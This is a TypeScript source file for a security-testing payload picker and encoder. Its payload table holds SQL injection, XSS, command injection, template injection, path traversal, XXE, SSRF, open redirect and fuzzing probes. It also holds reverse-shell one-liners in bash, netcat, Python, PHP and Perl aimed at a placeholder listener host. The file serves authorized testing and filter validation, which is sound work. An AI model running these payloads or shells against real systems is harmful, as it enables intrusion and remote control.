/**
 * Test-payload library and encoder for authorized security testing.
 *
 * Payloads are grouped by the class of weakness they probe, and are written here as an
 * original teaching/testing set rather than copied from any third-party collection, so
 * this file carries no external attribution or licensing obligations.
 *
 * Intended use is inserting known markers into a file you own or are authorized to
 * test: fixture generation, parser fuzz seeds, WAF and input-filter validation, CTF
 * work, and detection-rule tuning. The injector writes into the local buffer only --
 * nothing is transmitted, and nothing here is executed by this application.
 */

export type PayloadCategoryId =
  | "sqli" | "xss" | "command" | "ssti" | "traversal" | "xxe"
  | "ssrf" | "nosql" | "ldap" | "header" | "redirect" | "deserialize"
  | "fuzz" | "shell";

export interface Payload {
  name: string;
  value: string;
  /** What the payload probes for, shown beside it in the picker. */
  note: string;
}

export interface PayloadCategory {
  id: PayloadCategoryId;
  label: string;
  summary: string;
  payloads: Payload[];
}

export const PAYLOAD_CATEGORIES: PayloadCategory[] = [
  {
    id: "sqli",
    label: "SQL injection",
    summary: "Quote breaking, boolean and union probes, and time-based delays.",
    payloads: [
      { name: "Single quote", value: "'", note: "Provokes a parse error when input reaches SQL unquoted" },
      { name: "Always true", value: "' OR '1'='1", note: "Boolean bypass of a string comparison" },
      { name: "Comment terminator", value: "admin'--", note: "Truncates the remainder of the statement" },
      { name: "Union select", value: "' UNION SELECT NULL,NULL,NULL--", note: "Column-count discovery for union-based reads" },
      { name: "Time delay (MySQL)", value: "' OR SLEEP(5)--", note: "Blind detection through response timing" },
      { name: "Time delay (Postgres)", value: "'; SELECT pg_sleep(5)--", note: "Stacked-query timing probe" },
      { name: "Error based", value: "' AND EXTRACTVALUE(1,CONCAT(0x5c,VERSION()))--", note: "Surfaces data through an error message" },
      { name: "Stacked query (MSSQL)", value: "'; WAITFOR DELAY '0:0:5'--", note: "Stacked statement with a delay" }
    ]
  },
  {
    id: "xss",
    label: "Cross-site scripting",
    summary: "Tag breakouts, attribute escapes, and handler-based probes.",
    payloads: [
      { name: "Script tag", value: "<script>alert(1)</script>", note: "Baseline reflected or stored probe" },
      { name: "Image error handler", value: "<img src=x onerror=alert(1)>", note: "Fires without an inline script tag" },
      { name: "SVG onload", value: "<svg onload=alert(1)>", note: "Survives many tag allowlists" },
      { name: "Attribute breakout", value: "\" autofocus onfocus=alert(1) x=\"", note: "Escapes a quoted HTML attribute" },
      { name: "JavaScript URI", value: "javascript:alert(1)", note: "href and src sink probe" },
      { name: "Template literal", value: "${alert(1)}", note: "Client-side template evaluation" },
      { name: "Case-mixed handler", value: "<iMg SrC=x OnErRoR=alert(1)>", note: "Defeats case-sensitive filters" }
    ]
  },
  {
    id: "command",
    label: "Command injection",
    summary: "Shell metacharacters and separators for OS command sinks.",
    payloads: [
      { name: "Semicolon chain", value: "; id", note: "Statement separator on POSIX shells" },
      { name: "Pipe", value: "| id", note: "Pipes into a second command" },
      { name: "Backticks", value: "`id`", note: "Legacy command substitution" },
      { name: "Dollar substitution", value: "$(id)", note: "POSIX command substitution" },
      { name: "AND chain", value: "&& id", note: "Runs on success of the first command" },
      { name: "Newline separator", value: "\\nid\\n", note: "Breaks single-line argument handling" },
      { name: "Windows chain", value: "& whoami", note: "cmd.exe separator" },
      { name: "Blind timing", value: "; sleep 5", note: "Detection without visible output" }
    ]
  },
  {
    id: "ssti",
    label: "Template injection",
    summary: "Expression syntax for server-side template engines.",
    payloads: [
      { name: "Generic arithmetic", value: "{{7*7}}", note: "Renders 49 when evaluated" },
      { name: "Alternate delimiter", value: "${7*7}", note: "Freemarker, JSP EL, and similar" },
      { name: "Engine fingerprint", value: "{{7*'7'}}", note: "Distinguishes Jinja2 from Twig by output" },
      { name: "Velocity", value: "#set($x=7*7)$x", note: "Apache Velocity directive" },
      { name: "ERB", value: "<%= 7*7 %>", note: "Ruby ERB expression" },
      { name: "Config disclosure", value: "{{config.items()}}", note: "Dumps application configuration" }
    ]
  },
  {
    id: "traversal",
    label: "Path traversal / LFI",
    summary: "Directory escapes, encodings, and wrapper prefixes.",
    payloads: [
      { name: "POSIX traversal", value: "../../../../etc/passwd", note: "Baseline relative escape" },
      { name: "Windows traversal", value: "..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini", note: "Backslash separator variant" },
      { name: "URL encoded", value: "..%2f..%2f..%2fetc%2fpasswd", note: "Bypasses naive separator filters" },
      { name: "Double encoded", value: "..%252f..%252f..%252fetc%252fpasswd", note: "Defeats single-pass decoding" },
      { name: "Null byte suffix", value: "../../../etc/passwd%00.png", note: "Legacy extension truncation" },
      { name: "PHP filter wrapper", value: "php://filter/convert.base64-encode/resource=index.php", note: "Reads source rather than executing it" },
      { name: "Process environment", value: "/proc/self/environ", note: "Environment disclosure on Linux" }
    ]
  },
  {
    id: "xxe",
    label: "XXE / XML",
    summary: "External entity declarations and expansion bombs.",
    payloads: [
      { name: "File disclosure", value: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>", note: "External entity read" },
      { name: "Out-of-band DTD", value: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % x SYSTEM \"http://127.0.0.1/x.dtd\">%x;]><r/>", note: "Parameter entity fetching a remote DTD" },
      { name: "Entity expansion", value: "<?xml version=\"1.0\"?><!DOCTYPE l [<!ENTITY a \"aa\"><!ENTITY b \"&a;&a;\"><!ENTITY c \"&b;&b;\">]><l>&c;</l>", note: "Resource exhaustion through nested entities" },
      { name: "SVG entity", value: "<svg xmlns=\"http://www.w3.org/2000/svg\"><!DOCTYPE s [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><text>&x;</text></svg>", note: "XXE reached through an image parser" }
    ]
  },
  {
    id: "ssrf",
    label: "SSRF",
    summary: "Loopback, metadata, and scheme-confusion targets.",
    payloads: [
      { name: "Loopback", value: "http://127.0.0.1:80/", note: "Baseline internal request" },
      { name: "Decimal loopback", value: "http://2130706433/", note: "Numeric form evading string filters" },
      { name: "Cloud metadata", value: "http://169.254.169.254/latest/meta-data/", note: "Instance metadata endpoint" },
      { name: "File scheme", value: "file:///etc/passwd", note: "Scheme confusion in a URL fetcher" },
      { name: "Gopher smuggling", value: "gopher://127.0.0.1:6379/_INFO", note: "Protocol smuggling to a backend service" },
      { name: "Loopback hostname", value: "http://localtest.me/", note: "Hostname that resolves to loopback" }
    ]
  },
  {
    id: "nosql",
    label: "NoSQL injection",
    summary: "Operator objects and server-side JavaScript probes.",
    payloads: [
      { name: "Not equal", value: "{\"$ne\": null}", note: "Matches any document" },
      { name: "Greater than", value: "{\"$gt\": \"\"}", note: "Comparison operator bypass" },
      { name: "Regex wildcard", value: "{\"$regex\": \".*\"}", note: "Authentication bypass through matching" },
      { name: "Where clause", value: "{\"$where\": \"sleep(5000)\"}", note: "Server-side JavaScript timing probe" }
    ]
  },
  {
    id: "ldap",
    label: "LDAP injection",
    summary: "Filter metacharacters and wildcard bypasses.",
    payloads: [
      { name: "Wildcard", value: "*", note: "Matches every entry" },
      { name: "Filter breakout", value: "*)(uid=*))(|(uid=*", note: "Closes and reopens the filter" },
      { name: "Always true", value: "*)(|(objectClass=*", note: "Disjunction that always matches" }
    ]
  },
  {
    id: "header",
    label: "Header / CRLF",
    summary: "Response splitting, log forging, and host confusion.",
    payloads: [
      { name: "CRLF split", value: "%0d%0aSet-Cookie:injected=1", note: "Injects a header into the response" },
      { name: "Log forging", value: "%0d%0a[INFO] forged log entry", note: "Log injection through unescaped input" },
      { name: "Host override", value: "evil.example\\r\\nX-Forwarded-Host: evil.example", note: "Host header confusion" }
    ]
  },
  {
    id: "redirect",
    label: "Open redirect",
    summary: "Destination confusion in redirect parameters.",
    payloads: [
      { name: "Absolute", value: "https://evil.example/", note: "Plain external destination" },
      { name: "Protocol relative", value: "//evil.example", note: "Scheme-inherited redirect" },
      { name: "Backslash confusion", value: "https:/\\\\evil.example", note: "Parser disagreement on separators" },
      { name: "Userinfo trick", value: "https://trusted.example@evil.example", note: "Authority section misread as host" }
    ]
  },
  {
    id: "deserialize",
    label: "Deserialization markers",
    summary: "Format headers identifying serialized object streams.",
    payloads: [
      { name: "Java stream header", value: "\\xac\\xed\\x00\\x05", note: "Java serialization magic bytes" },
      { name: "Java base64 prefix", value: "rO0AB", note: "Base64 form seen in tokens and cookies" },
      { name: "PHP object", value: "O:8:\"stdClass\":0:{}", note: "PHP serialized object" },
      { name: "Python pickle", value: "\\x80\\x04\\x95", note: "Pickle protocol 4 opcode prefix" },
      { name: ".NET stream prefix", value: "AAEAAAD/////", note: "Base64 prefix of a .NET BinaryFormatter stream" }
    ]
  },
  {
    id: "fuzz",
    label: "Fuzzing / boundaries",
    summary: "Format strings, length patterns, and encoding edge cases.",
    payloads: [
      { name: "Format string", value: "%s%s%s%s%n", note: "Uncontrolled format specifier probe" },
      { name: "Long pattern (512)", value: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", note: "Buffer boundary probe; repeat as needed" },
      { name: "Cyclic pattern", value: "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9", note: "Offset identification after a crash" },
      { name: "Integer bounds", value: "-1 0 2147483647 2147483648 4294967295 -2147483648", note: "Signed and unsigned wraparound" },
      { name: "Overlong UTF-8", value: "\\xc0\\xae\\xc0\\xae\\xc0\\xaf", note: "Overlong encoding of a traversal sequence" },
      { name: "Control bytes", value: "\\x00\\x0a\\x0d\\x1a\\x7f", note: "Terminator and control-byte handling" }
    ]
  },
  {
    id: "shell",
    label: "Connect-back one-liners",
    summary:
      "Callback commands for verifying egress filtering and listener handling during " +
      "an authorized engagement. Host and port are left as placeholders.",
    payloads: [
      { name: "Bash TCP", value: "bash -i >& /dev/tcp/LISTENER_HOST/LISTENER_PORT 0>&1", note: "Requires a bash built with /dev/tcp support" },
      { name: "Netcat FIFO", value: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LISTENER_HOST LISTENER_PORT >/tmp/f", note: "For netcat builds without -e" },
      { name: "Python", value: "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"LISTENER_HOST\",LISTENER_PORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/sh\")'", note: "Spawns a pty for job control" },
      { name: "PHP", value: "php -r '$s=fsockopen(\"LISTENER_HOST\",LISTENER_PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", note: "Where a PHP binary is reachable" },
      { name: "Perl", value: "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(LISTENER_PORT,inet_aton(\"LISTENER_HOST\")));exec(\"/bin/sh -i\");'", note: "Common on older Unix hosts" },
      { name: "Listener side", value: "nc -lvnp LISTENER_PORT", note: "The receiving command, for reference" }
    ]
  }
];

export type EncodingId =
  | "raw" | "url" | "double-url" | "base64" | "hex" | "unicode" | "html" | "utf16le";

export interface EncodingOption {
  id: EncodingId;
  label: string;
  note: string;
}

export const ENCODINGS: EncodingOption[] = [
  { id: "raw", label: "Raw (no encoding)", note: "Bytes written exactly as shown" },
  { id: "url", label: "URL percent-encoding", note: "Everything outside the unreserved set as %XX" },
  { id: "double-url", label: "Double URL", note: "Percent-encoded twice, for double-decoding sinks" },
  { id: "base64", label: "Base64", note: "Standard alphabet with padding" },
  { id: "hex", label: "Hex string", note: "Two lowercase hex digits per byte" },
  { id: "unicode", label: "Unicode escapes", note: "\\uXXXX per code unit" },
  { id: "html", label: "HTML entities", note: "Numeric character references" },
  { id: "utf16le", label: "UTF-16LE bytes", note: "Wide-character encoding" }
];

/** Expands the `\xNN`, `\r`, `\n` and `\t` escapes used in the table above. */
function expandEscapes(value: string): string {
  return value
    .replace(/\\x([0-9a-fA-F]{2})/g, (_, hex: string) => String.fromCharCode(Number.parseInt(hex, 16)))
    .replace(/\\r/g, "\r")
    .replace(/\\n/g, "\n")
    .replace(/\\t/g, "\t");
}

/**
 * Encodes a payload into the bytes that will be written.
 *
 * Escapes are expanded first, so a marker written as `\xac\xed` becomes two bytes
 * rather than eight characters. The chosen transform then runs over that text.
 */
export function encodePayload(value: string, encoding: EncodingId): Uint8Array {
  const text = expandEscapes(value);
  const encoder = new TextEncoder();

  switch (encoding) {
    case "raw":
      return encoder.encode(text);

    case "url":
      return encoder.encode(percentEncode(text));

    case "double-url":
      return encoder.encode(percentEncode(percentEncode(text)));

    case "base64": {
      // btoa operates on latin1, so UTF-8 bytes are mapped to code points first.
      const bytes = encoder.encode(text);
      let binary = "";
      for (const byte of bytes) binary += String.fromCharCode(byte);
      return encoder.encode(btoa(binary));
    }

    case "hex": {
      const bytes = encoder.encode(text);
      let out = "";
      for (const byte of bytes) out += byte.toString(16).padStart(2, "0");
      return encoder.encode(out);
    }

    case "unicode": {
      let out = "";
      for (let i = 0; i < text.length; i += 1) {
        out += `\\u${text.charCodeAt(i).toString(16).padStart(4, "0")}`;
      }
      return encoder.encode(out);
    }

    case "html": {
      let out = "";
      for (const character of text) out += `&#${character.codePointAt(0) ?? 0};`;
      return encoder.encode(out);
    }

    case "utf16le": {
      const out = new Uint8Array(text.length * 2);
      for (let i = 0; i < text.length; i += 1) {
        const code = text.charCodeAt(i);
        out[i * 2] = code & 0xFF;
        out[i * 2 + 1] = (code >> 8) & 0xFF;
      }
      return out;
    }

    default:
      return encoder.encode(text);
  }
}

/**
 * Percent-encodes everything outside the unreserved set.
 *
 * Deliberately stricter than encodeURIComponent, which leaves `!'()*` untouched --
 * those are exactly the characters a separator filter is often looking for.
 */
function percentEncode(text: string): string {
  const bytes = new TextEncoder().encode(text);
  let out = "";
  for (const byte of bytes) {
    const character = String.fromCharCode(byte);
    if (/[A-Za-z0-9\-_.~]/.test(character)) out += character;
    else out += `%${byte.toString(16).padStart(2, "0").toUpperCase()}`;
  }
  return out;
}

/** Total payload count, for the interface summary. */
export function payloadCount(): number {
  return PAYLOAD_CATEGORIES.reduce((total, category) => total + category.payloads.length, 0);
}
